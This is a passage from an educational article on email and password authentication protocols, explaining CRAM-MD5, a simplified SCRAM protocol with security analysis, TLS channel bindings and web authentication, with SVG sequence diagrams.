        <line x1="0" y1="40.75" x2="0" y2="178.75"></line>
    </g>
    <g>
        <rect x="114.409" y="0" width="71.182" height="39.5" rx="8" ry="8"></rect>
        <text text-anchor="middle">
            <tspan x="150" y="25.65"><tspan>Server</tspan></tspan>
        </text>
        <line x1="150" y1="40.75" x2="150" y2="178.75"></line>
    </g>
    <g>
        <line x1="0" y1="81.5" x2="148.75" y2="81.5" marker-start="url(#circle-gray)" marker-end="url(#arrow-gray)" stroke-dasharray="142"></line>
        <text text-anchor="middle">
            <tspan x="74.375" y="69.5">(Connect)</tspan>
        </text>
    </g>
    <g>
        <line x1="150" y1="123.5" x2="1.25" y2="123.5" marker-start="url(#circle-green)" marker-end="url(#arrow-green)" stroke-dasharray="142"></line>
        <text text-anchor="middle">
            <tspan x="75.625" y="111.5">Challenge</tspan>
        </text>
    </g>
    <g>
        <line x1="0" y1="165.5" x2="148.75" y2="165.5" marker-start="url(#circle-blue)" marker-end="url(#arrow-blue)" stroke-dasharray="142"></line>
        <text text-anchor="middle">
            <tspan x="74.375" y="153.5">Response</tspan>
        </text>
    </g>

</svg>

    <figcaption>
How <a href="https://en.wikipedia.org/wiki/Challenge%E2%80%93response_authentication">challenge–response authentication</a> works.
</figcaption>
  </figure>

  <p><abbr title="Challenge-Response Authentication Mechanism">CRAM</abbr> is specified in <a href="https://datatracker.ietf.org/doc/html/rfc2195"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 2195</a>
and <a href="https://datatracker.ietf.org/doc/html/draft-ietf-sasl-crammd5-10">draft-ietf-sasl-crammd5</a>.
Unlike what <a href="https://developer.mozilla.org/en-US/docs/Mozilla/Thunderbird/Autoconfiguration/FileFormat/HowTo#Authentication">some documentation</a> suggests,
<abbr title="Challenge-Response Authentication Mechanism">CRAM</abbr> has nothing to do with encryption.
The client computes the response as <code>Response: hmac(Password, Challenge)</code>,
where the challenge was chosen randomly by the server.
The <a href="https://en.wikipedia.org/wiki/HMAC"><abbr title="Hash-based Message Authentication Code">HMAC</abbr></a> could be instantiated with any hash function
but the standard uses <a href="https://en.wikipedia.org/wiki/MD5"><abbr title="Message Digest version 5">MD5</abbr></a>,
which is why the full name of the mechanism is <code>CRAM-MD5</code>.
Let’s evaluate which of the <a href="#desirable-properties-of-authentication-mechanisms">above properties</a>
are fulfilled by <code>CRAM-MD5</code>:</p>
  <ol>
    <li><strong>Database compromise</strong>: In order to verify the response,
the server needs to be able to perform the same computation as the client.
Since the password is directly used as an input to the <abbr title="Hash-based Message Authentication Code">HMAC</abbr>,
the server has to store the password rather than its salted hash.
In this regard, <code>CRAM</code> is worse than <code>PLAIN</code>,
where only a <a href="#applications-of-cryptographic-hash-functions">derivation</a>
of the password needs to be stored.
Both the <a href="https://datatracker.ietf.org/doc/html/rfc2195#section-4"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr></a>
and the <a href="https://datatracker.ietf.org/doc/html/draft-ietf-sasl-crammd5-10#section-5">draft</a>
say that the security can be marginally improved by storing the state of the hash function
after feeding in the password instead of the password itself.
This is putting the <a href="#applications-of-cryptographic-hash-functions">length-extension vulnerability</a>
of many hash functions such as <abbr title="Message Digest version 5">MD5</abbr> to supposedly good use.
However, this doesn’t help at all because
if the server can continue from the intermediary state to determine the response,
then so can the attacker who compromised the database and tries to impersonate users.</li>
    <li><strong>Replay attacks</strong>: As long as the server never issues the same challenge twice,
the response from the client is valid only in the current session.
If an attacker replays an old response to a new challenge,
the server rejects the received value as invalid.</li>
    <li><strong>Pooled brute-force attacks</strong>: As a man-in-the-middle,
the attacker can send the same challenge to several clients.
Therefore, the attacker can test password candidates for several users at once.</li>
    <li><strong>Individual brute-force attacks</strong>: An authentication mechanism which isn’t resistant to
pooled brute-force attacks is also not resistant to individual brute-force attacks.</li>
    <li><strong>Denial-of-service attacks</strong>: Since the number of hashes
that a client has to compute per authentication is fixed,
denial-of-service attacks against the client aren’t possible
(as long as the size of the challenge is limited by the protocol).</li>
    <li><strong>Server impersonation</strong>: Since the client doesn’t authenticate the server,
an attacker can impersonate the server in one of the <a href="#dangerous-reliance-on-tls">above-mentioned ways</a>
and fake the success of the user authentication.</li>
    <li><strong>Wrong server</strong>: The client cannot detect when it’s connected to the wrong server.</li>
    <li><strong>Compromised certification authority</strong>:
The client cannot detect when the used certificate doesn’t belong to the real server.</li>
    <li><strong>Compromised server key</strong>: The client cannot detect when the server is impersonated
if the same certificate is being used.</li>
    <li><strong>Comparison attacks</strong>: Since the server stores the passwords,
it can easily determine if two accounts use the same password.</li>
    <li><strong>Wrong server after database compromise</strong>:
If the server’s authentication database has been compromised,
users have to change their password wherever they’re using it.</li>
    <li><strong>User impersonation after server compromise</strong>:
An attacker who has compromised the server can impersonate its users.</li>
  </ol>

  <p>Before we move on to <a href="#salted-challenge-response-authentication-mechanism"><abbr title="Salted Challenge-Response Authentication Mechanism">SCRAM</abbr></a>,
I wanted to visualize how a man-in-the-middle can relay all messages between the two parties:</p>

  <figure>
    <svg id="figure-challenge-response-authentication-mechanism-attack" data-name="challenge-response-authentication-mechanism-attack" width="389.24199999999996" height="307.25" viewBox="-44.621 -1.25 389.24199999999996 307.25" preserveAspectRatio="xMidYMid" xmlns="http://www.w3.org/2000/svg">

    <g>
        <rect x="-43.371" y="0" width="86.741" height="39.5" rx="8" ry="8"></rect>
        <text text-anchor="middle">
            <tspan x="0" y="25.65"><tspan>Client</tspan></tspan>
        </text>
        <line x1="0" y1="40.75" x2="0" y2="304.75"></line>
    </g>
    <g>
        <rect x="106.629" y="0" width="86.741" height="39.5" rx="8" ry="8"></rect>
        <text text-anchor="middle">
            <tspan x="150" y="25.65"><tspan>Attacker</tspan></tspan>
        </text>
        <line x1="150" y1="40.75" x2="150" y2="304.75"></line>
    </g>
    <g>
        <rect x="256.629" y="0" width="86.741" height="39.5" rx="8" ry="8"></rect>
        <text text-anchor="middle">
            <tspan x="300" y="25.65"><tspan>Server</tspan></tspan>
        </text>
        <line x1="300" y1="40.75" x2="300" y2="304.75"></line>
    </g>
    <g>
        <line x1="0" y1="81.5" x2="148.75" y2="81.5" marker-start="url(#circle-gray)" marker-end="url(#arrow-gray)" stroke-dasharray="142"></line>
        <text text-anchor="middle">
            <tspan x="74.375" y="69.5">(Connect)</tspan>
        </text>
    </g>
    <g>
        <line x1="150" y1="123.5" x2="298.75" y2="123.5" marker-start="url(#circle-gray)" marker-end="url(#arrow-gray)" stroke-dasharray="142"></line>
        <text text-anchor="middle">
            <tspan x="224.375" y="111.5">(Connect)</tspan>
        </text>
    </g>
    <g>
        <line x1="300" y1="165.5" x2="151.25" y2="165.5" marker-start="url(#circle-green)" marker-end="url(#arrow-green)" stroke-dasharray="142"></line>
        <text text-anchor="middle">
            <tspan x="225.625" y="153.5">Challenge</tspan>
        </text>
    </g>
    <g>
        <line x1="150" y1="207.5" x2="1.25" y2="207.5" marker-start="url(#circle-green)" marker-end="url(#arrow-green)" stroke-dasharray="142"></line>
        <text text-anchor="middle">
            <tspan x="75.625" y="195.5">Challenge</tspan>
        </text>
    </g>
    <g>
        <line x1="0" y1="249.5" x2="148.75" y2="249.5" marker-start="url(#circle-blue)" marker-end="url(#arrow-blue)" stroke-dasharray="142"></line>
        <text text-anchor="middle">
            <tspan x="74.375" y="237.5">Response</tspan>
        </text>
    </g>
    <g>
        <line x1="150" y1="291.5" x2="298.75" y2="291.5" marker-start="url(#circle-blue)" marker-end="url(#arrow-blue)" stroke-dasharray="142"></line>
        <text text-anchor="middle">
            <tspan x="224.375" y="279.5">Response</tspan>
        </text>
    </g>

</svg>

    <figcaption>

A <a href="https://en.wikipedia.org/wiki/Man-in-the-middle_attack">man-in-the-middle attack</a>
on a challenge-response authentication mechanism.

</figcaption>
  </figure>

</details>

<details>
  <summary id="salted-challenge-response-authentication-mechanism">
Salted Challenge-Response Authentication Mechanism (<abbr title="Salted Challenge-Response Authentication Mechanism">SCRAM</abbr>)
</summary>

  <p>Looking at its name, <a href="https://en.wikipedia.org/wiki/Salted_Challenge_Response_Authentication_Mechanism"><abbr title="Salted Challenge-Response Authentication Mechanism">SCRAM</abbr></a>
seems to be just a salted version of <a href="#challenge-response-authentication-mechanism"><abbr title="Challenge-Response Authentication Mechanism">CRAM</abbr></a>.
This is misleading, however, as <abbr title="Salted Challenge-Response Authentication Mechanism">SCRAM</abbr> is much more than that.
<abbr title="Salted Challenge-Response Authentication Mechanism">SCRAM</abbr> is specified in <a href="https://datatracker.ietf.org/doc/html/rfc5802"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 5802</a>
and improves on <abbr title="Challenge-Response Authentication Mechanism">CRAM</abbr> with the following, now mostly familiar techniques:</p>
  <ul>
    <li><a href="#applications-of-cryptographic-hash-functions"><strong>Key derivation</strong></a>:
Instead of using the password directly, <abbr title="Salted Challenge-Response Authentication Mechanism">SCRAM</abbr> uses
<a href="https://en.wikipedia.org/wiki/PBKDF2"><abbr title="Password-Based Key Derivation Function 2">PBKDF2</abbr></a> to derive a
<a href="https://en.wikipedia.org/wiki/Key_(cryptography)">cryptographic key</a>.
By <a href="#salts-against-pooled-brute-force-attacks">salting</a> the password and hashing it thousands of times,
a <a href="https://en.wikipedia.org/wiki/Brute-force_search">brute-force search</a>
for the password given the key becomes very costly.</li>
    <li><a href="#applications-of-cryptographic-hash-functions"><strong>Message authentication</strong></a>:
The derived key is used to authenticate a message from the client to the server
and a message from the server to the client with an <a href="https://en.wikipedia.org/wiki/HMAC"><abbr title="Hash-based Message Authentication Code">HMAC</abbr></a>.
The server can authenticate its message only if it knows the derived key.
We thus have <a href="https://en.wikipedia.org/wiki/Mutual_authentication">mutual authentication</a>:
The server is certain that the user is who they claim to be
and the client is certain that the message came from the right server.</li>
    <li><a href="#exclusive-or-operation-for-perfect-encryption"><strong>Exclusive-or encryption</strong></a>:
The problem is that the server shouldn’t store this key.
Otherwise, anyone who compromised its database can impersonate the user
by authenticating the appropriate message with the stolen key.
This can be solved by storing a hash of the derived key instead.
Note that the derived key doesn’t need to be salted and stretched here
because the best way to find the preimage of the hashed key is to guess the low-entropy password,
which is itself already salted and stretched to arrive at the derived key.
The client then uses the hashed key to authenticate its message.
So far we have only moved the problem, though,
because the hashed key now has the same role as the derived key before.
The trick is that the client proves to the server
that it knows the preimage of the stored key
by encrypting the preimage with the <abbr title="Hash-based Message Authentication Code">HMAC</abbr>.
Since only the legitimate parties can compute the <abbr title="Hash-based Message Authentication Code">HMAC</abbr>,
the server can decrypt the preimage but the attacker cannot.
If this is confusing, then re-read this paragraph after you’ve seen the protocol flow below.</li>
    <li><a href="#tls-channel-bindings"><strong>Optional channel binding</strong></a>:
The authenticated message includes everything
which the client and the server have to agree on.
One useful thing to agree on is that they are connected to the same secure channel.
Binding the channel on the <a href="https://evalapply.org/internet/#application-layer">application layer</a>
to the channel on the <a href="https://evalapply.org/internet/#security-layer">security layer</a>
prevents <a href="https://en.wikipedia.org/wiki/Man-in-the-middle_attack">man-in-the-middle attacks</a>.
<a href="https://datatracker.ietf.org/doc/html/rfc5802#section-6">Channel binding</a> is optional in <abbr title="Salted Challenge-Response Authentication Mechanism">SCRAM</abbr>.
There are different ways to bind the inner channel to the outer channel with different tradeoffs.
We’ll cover them in the <a href="#tls-channel-bindings">next box</a>.</li>
  </ul>

  <figure>
    <svg id="figure-channel-binding" data-name="channel-binding" width="358.41" height="42" viewBox="-1.25 -1.25 358.41 42" preserveAspectRatio="xMidYMid" xmlns="http://www.w3.org/2000/svg">

    <line x1="71.495" y1="4.75" x2="142.052" y2="4.75"></line>
    <line x1="71.495" y1="34.75" x2="142.052" y2="34.75"></line>
    <line x1="213.859" y1="4.75" x2="284.416" y2="4.75"></line>
    <line x1="213.859" y1="34.75" x2="284.416" y2="34.75"></line>
    <rect x="142.364" y="0" width="71.182" height="39.5" rx="8" ry="8"></rect>
    <line x1="71.495" y1="14.75" x2="283.478" y2="14.75" marker-end="url(#arrow-green)" stroke-dasharray="205"></line>
    <line x1="284.416" y1="24.75" x2="72.432" y2="24.75" marker-end="url(#arrow-green)" stroke-dasharray="205"></line>
    <rect x="0" y="0" width="71.182" height="39.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="35.591" y="25.65"><tspan>Client</tspan></tspan>
    </text>
    <rect x="284.728" y="0" width="71.182" height="39.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="320.319" y="25.65"><tspan>Server</tspan></tspan>
    </text>

</svg>

    <figcaption>
<strong>Mutual authentication</strong> guarantees only that the inner channel (in green) reaches the counterparty.</figcaption>
  </figure>

  <p>What follows is a simplified version of the <abbr title="Salted Challenge-Response Authentication Mechanism">SCRAM</abbr> protocol.
I believe it has the same properties as the official protocol,
and I’m not aware of any vulnerabilities.
However, be aware that my simplifications haven’t been reviewed.
The <abbr title="Salted Challenge-Response Authentication Mechanism">SCRAM</abbr> standard might do things differently for good reasons,
which I just haven’t thought of.
For the sake of compatibility and security,
implement the <a href="https://datatracker.ietf.org/doc/html/rfc5802#section-3">official protocol</a>!
I simplified the protocol only to make it easier to understand.
The biggest differences are that I don’t separate the “server key” from the “client key”
and that I removed the redundancy in the transmitted and thus authenticated messages.
Reducing the number of variables allows me to use less confusing names for them.
I didn’t just simplify <abbr title="Salted Challenge-Response Authentication Mechanism">SCRAM</abbr>, though,
I also provide suggestions for improving <abbr title="Salted Challenge-Response Authentication Mechanism">SCRAM</abbr> in my analysis below.
Let’s have a look now at how <code>Simplified-SCRAM</code> works.</p>

  <p>As with every password-based authentication mechanism,
the user’s credentials are <code>Username</code> and <code>Password</code>.
We also have:</p>
  <ul>
    <li><code>Salt</code> and <code>IterationCount</code>:
The values to derive the <code>Key</code> from the <code>Password</code>.
The <abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> doesn’t specify who chooses the <code>Salt</code>.</li>
    <li><code>ClientNonce</code> and <code>ServerNonce</code>:
Values chosen at random for each session.
The former by the client, the latter by the server.</li>
    <li><code>ChannelBinding</code>: A string which identifies the <abbr title="Transport Layer Security">TLS</abbr> channel over which the messages are sent.
See the <a href="#tls-channel-bindings">next box</a> for options.</li>
  </ul>

  <p>The client and the server compute the following values based on the above values:</p>
  <ul>
    <li><code>Key: pbkdf2(Password, Salt, IterationCount)</code></li>
    <li><code>HashedKey: hash(Key)</code></li>
    <li><code>Message: Username + ClientNonce + ServerNonce + ChannelBinding</code></li>
    <li><code>HashedKeyMac: hmac(HashedKey, Message)</code></li>
    <li><code>KeyXorHashedKeyMac: Key ⊕ HashedKeyMac</code></li>
    <li><code>KeyMac: hmac(Key, Message)</code></li>
  </ul>

  <p>For each user, the server stores <code>Username</code>, <code>Salt</code>, <code>IterationCount</code>, and <code>HashedKey</code>.
The following messages are exchanged:</p>

  <figure>
    <svg id="figure-salted-challenge-response-authentication-mechanism" data-name="salted-challenge-response-authentication-mechanism" width="373.682" height="223.25" viewBox="-36.841 -1.25 373.682 223.25" preserveAspectRatio="xMidYMid" xmlns="http://www.w3.org/2000/svg">

    <g>
        <rect x="-35.591" y="0" width="71.182" height="39.5" rx="8" ry="8"></rect>
        <text text-anchor="middle">
            <tspan x="0" y="25.65"><tspan>Client</tspan></tspan>
        </text>
        <line x1="0" y1="40.75" x2="0" y2="220.75"></line>
    </g>
    <g>
        <rect x="264.409" y="0" width="71.182" height="39.5" rx="8" ry="8"></rect>
        <text text-anchor="middle">
            <tspan x="300" y="25.65"><tspan>Server</tspan></tspan>
        </text>
        <line x1="300" y1="40.75" x2="300" y2="220.75"></line>
    </g>
    <g>
        <line x1="0" y1="81.5" x2="298.75" y2="81.5" marker-start="url(#circle-blue)" marker-end="url(#arrow-blue)" stroke-dasharray="292"></line>
        <text text-anchor="middle">
            <tspan x="149.375" y="69.5">Username, ClientNonce</tspan>
        </text>
    </g>
    <g>
        <line x1="300" y1="123.5" x2="1.25" y2="123.5" marker-start="url(#circle-green)" marker-end="url(#arrow-green)" stroke-dasharray="292"></line>
        <text text-anchor="middle">
            <tspan x="150.625" y="111.5">ServerNonce, Salt, IterationCount</tspan>
        </text>
    </g>
    <g>
        <line x1="0" y1="165.5" x2="298.75" y2="165.5" marker-start="url(#circle-blue)" marker-end="url(#arrow-blue)" stroke-dasharray="292"></line>
        <text text-anchor="middle">
            <tspan x="149.375" y="153.5">KeyXorHashedKeyMac</tspan>
        </text>
    </g>
    <g>
        <line x1="300" y1="207.5" x2="1.25" y2="207.5" marker-start="url(#circle-green)" marker-end="url(#arrow-green)" stroke-dasharray="292"></line>
        <text text-anchor="middle">
            <tspan x="150.625" y="195.5">KeyMac</tspan>
        </text>
    </g>

</svg>

    <figcaption>
The <a href="https://en.wikipedia.org/wiki/Sequence_diagram">sequence diagram</a> of <code>Simplified-SCRAM</code>.
</figcaption>
  </figure>

  <p>Since a user has to be able to authenticate themself on a new client with just their <code>Username</code> and <code>Password</code>,
the server has to store the <code>Salt</code> and the <code>IterationCount</code> and provide it to the client on request.
Since the user is not yet authenticated at this stage,
anyone can request the <code>Salt</code> and the <code>IterationCount</code> of any user.
(The <code>IterationCount</code> determines how many times the salted password is hashed.)
After the first two messages, both the client and the server can compose the <code>Message</code>
and compute the <code>HashedKeyMac</code> as the <abbr title="Hash-based Message Authentication Code">HMAC</abbr> with the <code>HashedKey</code>.
The client then sends the <code>Key</code> encrypted with the <code>HashedKeyMac</code> to the server,
which decrypts the <code>Key</code> as <code>KeyXorHashedKeyMac ⊕ HashedKeyMac</code>.
In the next step, the server verifies whether <code>hash(Key) = HashedKey</code>.
If this is the case, it has successfully authenticated the client.
If not, the server aborts the session.
At last, the server uses the <code>Key</code> to authenticate the same <code>Message</code> to the client.
By also computing <code>KeyMac</code>, the client can verify that the last message was indeed sent by the server.
Since both parties can compose the <code>Message</code>,
the message authentication codes (<abbr title="Message Authentication Code">MAC</abbr>) can be sent without the <code>Message</code>.
The <code>Username</code> is included in the <code>Message</code> because it wasn’t authenticated in the first message.
Without this, a man-in-the-middle could replace it to authenticate the user for another account
where they use the same password.
Let’s analyze how <code>Simplified-SCRAM</code> is or can be made resistant
to all but one of the <a href="#desirable-properties-of-authentication-mechanisms">above properties</a>:</p>
  <ol>
    <li><strong>Database compromise</strong> thanks to salting and stretching:
An attacker who compromised the server’s database learns only the <code>HashedKey</code>
but not the <code>Key</code>, which is required to impersonate a user.
As noted above, the best way to find the preimage of the <code>HashedKey</code>
is to guess the low-entropy <code>Password</code>.
Due to the <code>Salt</code>, the <code>Password</code> of each user has to be attacked separately.
Due to the <code>IterationCount</code>, the search for the <code>Password</code>
is slowed down by several orders of magnitude.</li>
    <li><strong>Replay attacks</strong> thanks to the server nonce:
As long as the server doesn’t issue the same <code>ServerNonce</code> twice,
earlier <code>KeyXorHashedKeyMac</code> values cannot be replayed
because the earlier <abbr title="Message Authentication Code">MAC</abbr> doesn’t match the current <code>Message</code>.</li>
    <li><strong>Pooled brute-force attacks</strong> thanks to the client nonce:
Even if the <code>ServerNonce</code>, <code>Salt</code>, and <code>IterationCount</code> are chosen by a man-in-the-middle,
<code>KeyXorHashedKeyMac</code> depends on the unique <code>ClientNonce</code>, which prevents pooled brute-force attacks.</li>
    <li><strong>Individual brute-force attacks</strong> thanks to a minimum iteration count:
Unfortunately, the <a href="https://datatracker.ietf.org/doc/html/rfc5802#page-13">standard says only</a>
that servers should choose an <code>IterationCount</code> of at least 4096.
It’s important, however, that clients are programmed to reject an <code>IterationCount</code> below a certain threshold.
Otherwise, a man-in-the-middle can send an <code>IterationCount</code> of 1,
which makes it much easier to search for the <code>Password</code> that led to <code>KeyXorHashedKeyMac</code>.
While this weakness can easily be addressed when writing a client,
not standardizing the minimum iteration count can lead to incompatibilities
between different implementations of the standard.</li>
    <li><strong>Denial-of-service attacks</strong> thanks to a maximum iteration count:
The <a href="https://datatracker.ietf.org/doc/html/rfc5802#page-22">standard notes</a>
that a compromised server or a man-in-the-middle can perform a computational denial-of-service attack on clients
by sending a big <code>IterationCount</code>.
For this reason, clients should reject an <code>IterationCount</code> above a certain threshold.
This threshold can be relatively high
because the derived <code>Key</code> can be cached by the client for future authentications.
This means that each client has to perform the key derivation only once.
It’s therefore no problem if the derivation takes several seconds.</li>
    <li><strong>Server impersonation</strong> thanks to mutual authentication:
The <code>KeyMac</code> prevents an attacker from faking the authentication success.
Since the <code>KeyMac</code> depends on the <code>ClientNonce</code>,
the server messages cannot be replayed from an earlier session.</li>
    <li><strong>Wrong server</strong> thanks to binding to the domain name:
We will look at the two standardized options for channel binding in the <a href="#tls-channel-bindings">next box</a>.
For now, let’s imagine that a variant of <abbr title="Salted Challenge-Response Authentication Mechanism">SCRAM</abbr> requires
that the domain name of the server is appended to the <code>Message</code>.
In other words, <code>ChannelBinding: ServerDomain</code>.
Due to mutual authentication, a man-in-the-middle is forced
to relay the communication between the client and the server.
If the client connects to the <a href="#dangerous-reliance-on-tls">wrong server</a>,
then the <code>Message</code> on the client is different from the <code>Message</code> on the actual server,
which causes the authentication to fail.</li>
    <li><strong>Compromised certification authority</strong> thanks to binding to the server certificate:
We can improve on the domain binding with <code>ChannelBinding: hash(ServerCertificate)</code>.
This prevents a man-in-the-middle from using a different certificate for the same <code>ServerDomain</code>,
which they might obtain from a compromised certification authority.</li>
    <li><strong>Compromised server key</strong> thanks to binding to the session key:
<abbr title="Transport Layer Security">TLS</abbr> uses a <a href="https://en.wikipedia.org/wiki/Diffie%E2%80%93Hellman_key_exchange">Diffie–Hellman key exchange</a>
to derive a session key, which is then used to encrypt and authenticate all messages.
By choosing <code>ChannelBinding: hash(SessionKey)</code>,
we can detect a man-in-the-middle who compromised the private key of the server’s certificate.
Either the <abbr title="Transport Layer Security">TLS</abbr> connections from the client to the attacker
and from the attacker to the server have different session keys,
or the attacker can neither decrypt nor modify the communication between the client and the server.
In the latter case, <abbr title="Transport Layer Security">TLS</abbr> fulfills its purpose.</li>
    <li><strong>Comparison attacks</strong> thanks to a user-specific salt:
If I could have written the standard,
the <code>Salt</code> would be prefixed with the user’s <code>Username</code> in the key derivation:
<code>Key: pbkdf2(Password, Username + Salt, IterationCount)</code>.
Not only does this prevent a compromised server from determining
whether two accounts are protected with the same <code>Password</code>,
it also guarantees the user that
an attacker cannot run a pooled brute-force attack after compromising the database.
Otherwise, a faulty server implementation,
which chooses the same <code>Salt</code> for every user,
can ruin the brute-force resistance for its users.</li>
    <li><strong>Wrong server after database compromise</strong> thanks to a server-specific salt:
I would even go one step further and prefix the <code>Salt</code> also with the <code>ServerDomain</code>:
<code>Key: pbkdf2(Password, ServerDomain + Username + Salt, IterationCount)</code>.
This prevents one service provider from impersonating the user at another service provider
once the database of the latter has been compromised.
Without this prefix, the former service provider can send back
the <code>Salt</code> and the <code>IterationCount</code> from the compromised database
and recover the <code>Key</code> used with the latter service provider.
Since the former provider also knows the <code>HashedKey</code>,
the mutual authentication will succeed,
which makes the attack unnoticeable to the user.
Another desirable benefit of this prefix is that
it forces different servers to use separate authentication databases.
For example, an attacker who compromised the outgoing mail server
would no longer be able to retrieve the user’s mail at the incoming mail server.
However, these precautions make sense only
if the <code>Password</code> is never shared with the server, not even when setting the password.
This means that the client has to choose the <code>Salt</code> and the <code>IterationCount</code>
and then generate the string <code>Salt + IterationCount + HashedKey</code>
so that the user can paste it into the account configuration interface.
For this to work, setting and replacing the password would have to be standardized as well.</li>
    <li><strong>User impersonation after server compromise</strong>:
<abbr title="Salted Challenge-Response Authentication Mechanism">SCRAM</abbr> is not resistant to a server compromise.
If an attacker manages to control the server
(or alternatively to compromise the database and to intercept the communication channel),
they learn the <code>Key</code>, which is all that is needed to impersonate the user.
In order to prevent this, we need <a href="#password-authenticated-key-exchange">public-key cryptography</a>.</li>
  </ol>

  <p>The remaining boxes in this subsection just add more context.
The conclusion of this little detour is the same as the conclusion of the whole article:
We could do so much better if we only wanted to (and were better informed).
The standards exist, we just need to deploy them…</p>

</details>

<details>
  <summary id="tls-channel-bindings">
<abbr title="Transport Layer Security">TLS</abbr> channel bindings (<abbr title="Salted Challenge-Response Authentication Mechanism">SCRAM</abbr>-PLUS)
</summary>

  <p>Channel binding is discussed in <a href="https://datatracker.ietf.org/doc/html/rfc5802#section-6">section 6 of <abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 5802</a>.
If a server supports channel binding,
it advertises the authentication mechanism as <code>SCRAM-&lt;hash-function&gt;-PLUS</code>.
An example is <code>SCRAM-SHA-256-PLUS</code> as specified in <a href="https://datatracker.ietf.org/doc/html/rfc7677"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 7677</a>.
Since mutual authentication is established on the application layer by <code>SCRAM</code>,
the security layer has to provide only message confidentiality and message authentication
but not <a href="https://evalapply.org/internet/#transport-layer-security">party authentication</a> when channel binding is used.
As a consequence, <code>SCRAM-PLUS</code> can be used without a <a href="https://evalapply.org/internet/#public-key-infrastructure">public-key infrastructure</a>,
which means that servers can use <a href="https://en.wikipedia.org/wiki/Self-signed_certificate">self-signed certificates</a>.
Binding the application layer to the security layer doesn’t change the security layer.
A <abbr title="Transport Layer Security">TLS</abbr> implementation needs to be changed only if it doesn’t allow the application layer to access the necessary values.</p>

  <p><a href="https://datatracker.ietf.org/doc/html/rfc5929"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 5929</a> defines three different channel bindings for <abbr title="Transport Layer Security">TLS</abbr>,
where only two of them are relevant for us:</p>
  <ul>
    <li><a href="https://datatracker.ietf.org/doc/html/rfc5929#section-4"><code>tls-server-end-point</code></a>
uses the hash of the server’s certificate: <code>hash(ServerCertificate)</code>.
The advantage of this binding is that
it can easily be used with a <a href="https://en.wikipedia.org/wiki/Reverse_proxy">reverse proxy</a>.
Its disadvantage is that it doesn’t protect against compromised server keys.</li>
    <li><a href="https://datatracker.ietf.org/doc/html/rfc5929#section-3"><code>tls-unique</code></a>
uses the first <abbr title="Transport Layer Security">TLS</abbr> <code>Finished</code> message of the latest
<a href="https://en.wikipedia.org/wiki/Transport_Layer_Security#TLS_handshake"><abbr title="Transport Layer Security">TLS</abbr> handshake</a>.
Since the <code>Finished</code> message contains a hash over all previous handshake messages,
it uniquely identifies a particular <abbr title="Transport Layer Security">TLS</abbr> connection.
For full <abbr title="Transport Layer Security">TLS</abbr> handshakes, the first <code>Finished</code> message is sent by the client.
For abbreviated <abbr title="Transport Layer Security">TLS</abbr> handshakes, the first <code>Finished</code> message is sent by the server.
Depending on which type of handshake has been performed and which of the two endpoints you implement,
you have to call either <a href="https://nodejs.org/api/tls.html#tls_tlssocket_getfinished"><code>getFinished()</code></a>
or <a href="https://nodejs.org/api/tls.html#tls_tlssocket_getpeerfinished"><code>getPeerFinished()</code></a>
to access the <a href="https://github.com/openssl/openssl/blob/c87a7f31a3db97376d764583ad5ee4a76db2cbef/include/openssl/ssl.h.in#L1121-L1128">right message</a> for channel binding.
In theory, <code>tls-unique</code> is the preferred option for channel binding
because it also prevents attacks with <a href="#dangerous-reliance-on-tls">compromised server keys</a>.
In practice, however, <code>tls-unique</code> requires
proxy servers to forward the first <code>Finished</code> message to the application server
so that it can compose the <a href="#salted-challenge-response-authentication-mechanism"><abbr title="Salted Challenge-Response Authentication Mechanism">SCRAM</abbr></a> <code>Message</code> correctly,
which makes this option more difficult to deploy.</li>
  </ul>

</details>

<details>
  <summary id="authentication-on-the-web">
Authentication on the Web
</summary>

  <p>Given the many <a href="#desirable-properties-of-authentication-mechanisms">desirable properties</a>
of <a href="#salted-challenge-response-authentication-mechanism"><abbr title="Salted Challenge-Response Authentication Mechanism">SCRAM</abbr></a>,
you might wonder whether we can also use this mechanism when logging in to websites.
The short answer is yes: Apart from <a href="#tls-channel-bindings">channel binding</a>,
you can implement <abbr title="Salted Challenge-Response Authentication Mechanism">SCRAM</abbr> with <a href="https://en.wikipedia.org/wiki/JavaScript">JavaScript</a>
in the <a href="https://en.wikipedia.org/wiki/Web_browser">browser</a>.
The longer answer is no: Since users cannot trust the code that is loaded by a website,
nothing is gained by implementing <abbr title="Salted Challenge-Response Authentication Mechanism">SCRAM</abbr> for logging in to your website.
The most desirable property for authentication mechanisms on the Web
is to prevent <a href="https://en.wikipedia.org/wiki/Phishing">phishing</a>,
where a victim is tricked to connect to a <a href="#dangerous-reliance-on-tls">wrong server</a>.
Since in this case the <a href="#webmail">code is loaded</a> directly from the attacker,
it can send your password directly to the attacker.
The only way to make password-based authentication on the Web secure
is to move the functionality from a webpage to the browser and to expose it through an <abbr title="Application Programming Interface">API</abbr>.
This could be achieved with a <code>SCRAM-SHA-256-PLUS</code> extension to
<a href="https://en.wikipedia.org/wiki/HTTP_authentication"><abbr title="HyperText Transfer Protocol">HTTP</abbr> authentication</a>,
where the browser takes care of the authentication messages and the server sets the
<a href="https://en.wikipedia.org/wiki/Session_(computer_science)#HTTP_session_token">session cookie</a> on success.
This is not likely to happen anytime soon, though.
The trend goes rather towards replacing or supplementing password-based authentication
with <a href="https://en.wikipedia.org/wiki/Public-key_cryptography">public-key cryptography</a>,
for example with the <a href="https://en.wikipedia.org/wiki/WebAuthn">Web Authentication (WebAuthn)</a> standard.
None of this is a problem for <a href="#mail-client">mail clients</a>, though,
since their code isn’t loaded from untrusted sources.</p>

</details>

<details>
  <summary id="password-authenticated-key-exchange">
Password-authenticated key exchange (<abbr title="Password-Authenticated Key Exchange">PAKE</abbr>)
</summary>

  <p>The goal of <a href="https://en.wikipedia.org/wiki/Key_exchange">key exchange protocols</a> is to establish
a <a href="https://en.wikipedia.org/wiki/Shared_secret">shared secret</a> between two parties,
which can then be used to encrypt and authenticate all messages between them.
In order to ensure that the secret is shared between the intended parties,
they need to authenticate themselves initially.
